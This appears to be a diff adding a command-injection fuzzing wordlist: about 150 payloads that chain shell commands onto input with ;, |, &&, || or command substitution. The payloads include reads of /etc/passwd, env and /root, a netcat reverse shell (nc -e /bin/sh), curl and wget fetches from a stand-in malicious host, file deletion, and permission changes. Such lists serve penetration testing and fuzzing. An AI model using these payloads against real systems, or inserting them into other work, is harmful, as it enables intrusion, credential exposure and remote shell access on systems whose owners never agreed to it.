@@ -1,0 +1,156 @@
+; ls
+| ls
+&& ls
+|| ls
+; whoami
+| whoami
+&& whoami
+|| whoami
+; cat /etc/passwd
+| cat /etc/passwd
+&& cat /etc/passwd
+|| cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+; uname -a
+| uname -a
+&& uname -a
+|| uname -a
+$(uname -a)
+`uname -a`
+; id
+| id
+&& id
+|| id
+`id`
+$(id)
+; pwd
+| pwd
+&& pwd
+|| pwd
+`pwd`
+$(pwd)
+; ps aux
+| ps aux
+&& ps aux
+|| ps aux
+; echo vulnerable
+| echo vulnerable
+&& echo vulnerable
+|| echo vulnerable
+; sleep 10
+| sleep 10
+&& sleep 10
+|| sleep 10
+; ping -c 4 127.0.0.1
+| ping -c 4 127.0.0.1
+&& ping -c 4 127.0.0.1
+|| ping -c 4 127.0.0.1
+; /bin/sh
+| /bin/sh
+&& /bin/sh
+|| /bin/sh
+; nc -e /bin/sh 127.0.0.1 1234
+| nc -e /bin/sh 127.0.0.1 1234
+&& nc -e /bin/sh 127.0.0.1 1234
+|| nc -e /bin/sh 127.0.0.1 1234
+; curl http://malicious.example.com
+| curl http://malicious.example.com
+&& curl http://malicious.example.com
+|| curl http://malicious.example.com
+; wget http://malicious.example.com
+| wget http://malicious.example.com
+&& wget http://malicious.example.com
+|| wget http://malicious.example.com
+; nmap localhost
+| nmap localhost
+&& nmap localhost
+|| nmap localhost
+; netstat -an
+| netstat -an
+&& netstat -an
+|| netstat -an
+; arp -a
+| arp -a
+&& arp -a
+|| arp -a
+; touch /tmp/vulnerable
+| touch /tmp/vulnerable
+&& touch /tmp/vulnerable
+|| touch /tmp/vulnerable
+; rm -f /tmp/testfile
+| rm -f /tmp/testfile
+&& rm -f /tmp/testfile
+|| rm -f /tmp/testfile
+; echo hello > /tmp/hello.txt
+| echo hello > /tmp/hello.txt
+&& echo hello > /tmp/hello.txt
+|| echo hello > /tmp/hello.txt
+; mv /tmp/hello.txt /tmp/hello_moved.txt
+| mv /tmp/hello.txt /tmp/hello_moved.txt
+&& mv /tmp/hello.txt /tmp/hello_moved.txt
+|| mv /tmp/hello.txt /tmp/hello_moved.txt
+; cp /etc/passwd /tmp/passwd_copy
+| cp /etc/passwd /tmp/passwd_copy
+&& cp /etc/passwd /tmp/passwd_copy
+|| cp /etc/passwd /tmp/passwd_copy
+; find / -name passwd
+| find / -name passwd
+&& find / -name passwd
+|| find / -name passwd
+; history
+| history
+&& history
+|| history
+; chmod 777 /tmp/testfile
+| chmod 777 /tmp/testfile
+&& chmod 777 /tmp/testfile
+|| chmod 777 /tmp/testfile
+; chown root:root /tmp/testfile
+| chown root:root /tmp/testfile
+&& chown root:root /tmp/testfile
+|| chown root:root /tmp/testfile
+; mount
+| mount
+&& mount
+|| mount
+; df -h
+| df -h
+&& df -h
+|| df -h
+; ifconfig
+| ifconfig
+&& ifconfig
+|| ifconfig
+; cat /proc/cpuinfo
+| cat /proc/cpuinfo
+&& cat /proc/cpuinfo
+|| cat /proc/cpuinfo
+; ls /home
+| ls /home
+&& ls /home
+|| ls /home
+; ls /root
+| ls /root
+&& ls /root
+|| ls /root
+; cat /etc/hosts
+| cat /etc/hosts
+&& cat /etc/hosts
+|| cat /etc/hosts
+; env
+| env
+&& env
+|| env
+; hostname
+| hostname
+&& hostname
+|| hostname
+; ls /var/log
+| ls /var/log
+&& ls /var/log
+|| ls /var/log
+; nc -nv 127.0.0.1 1234
+| nc -nv 127.0.0.1 1234
+&& nc -nv 127.0.0.1 1234
+|| nc -nv 127.0.0.1 1234
